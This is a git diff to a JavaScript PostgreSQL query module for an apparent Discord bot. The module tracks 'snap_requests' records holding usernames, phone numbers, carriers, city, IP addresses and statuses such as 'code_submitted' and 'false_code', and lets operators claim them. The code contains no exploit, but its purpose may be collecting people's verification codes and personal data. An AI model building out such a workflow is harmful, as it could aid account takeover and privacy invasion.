@@ -1,9 +1,5 @@
 /**
  * database.js — Neon PostgreSQL queries
- *
- * BUG 3 FIX: getCodeSubmittedRequests now queries by updated_at (timestamp)
- * instead of id, so re-submissions after a false_code are properly detected.
- * The snap_requests table already has an updated_at trigger (see neon.sql).
  */
 
 import { neon } from "@neondatabase/serverless";
@@ -20,6 +16,18 @@ export async function getRequestByPhone(phone) {
     return rows[0] || null;
 }
 
+/**
+ * Returns the Discord user ID of whoever claimed this request.
+ * Used as fallback when the in-memory claimedBy Map is empty (bot restart).
+ * Requires the claimed_by_discord_id column (migration_v2.2.sql).
+ */
+export async function getClaimedBy(phone) {
+    const rows = await sql`
+        SELECT claimed_by_discord_id FROM snap_requests WHERE phone = ${phone} LIMIT 1
+    `;
+    return rows[0]?.claimed_by_discord_id ?? null;
+}
+
 export async function updateStatus(phone, status) {
     await sql`UPDATE snap_requests SET status = ${status} WHERE phone = ${phone}`;
 }
@@ -33,16 +41,12 @@ export async function logAction(action, details) {
             VALUES (${action}, ${JSON.stringify(details)})
         `;
     } catch {
-        // snap_logs table may not exist in older deployments — non-fatal
+        // snap_logs may not exist in older deployments — non-fatal
     }
 }
 
 // ─── Polling queries ──────────────────────────────────────────────────────────
 
-/**
- * Returns pending requests with id > lastId (new INSERTs only).
- * @param {number} lastId
- */
 export async function getPendingRequests(lastId) {
     return await sql`
         SELECT id, username, phone, operator, country, city, ip_address, status, created_at, updated_at
@@ -54,8 +58,7 @@ export async function getPendingRequests(lastId) {
 
 /**
  * Returns code_submitted requests updated after `since`.
- * BUG 3 FIX: using updated_at so retries (same row, new UPDATE) are detected.
- * @param {Date} since
+ * Timestamp-based so retries (same row, new UPDATE) are detected.
  */
 export async function getCodeSubmittedRequests(since) {
     return await sql`
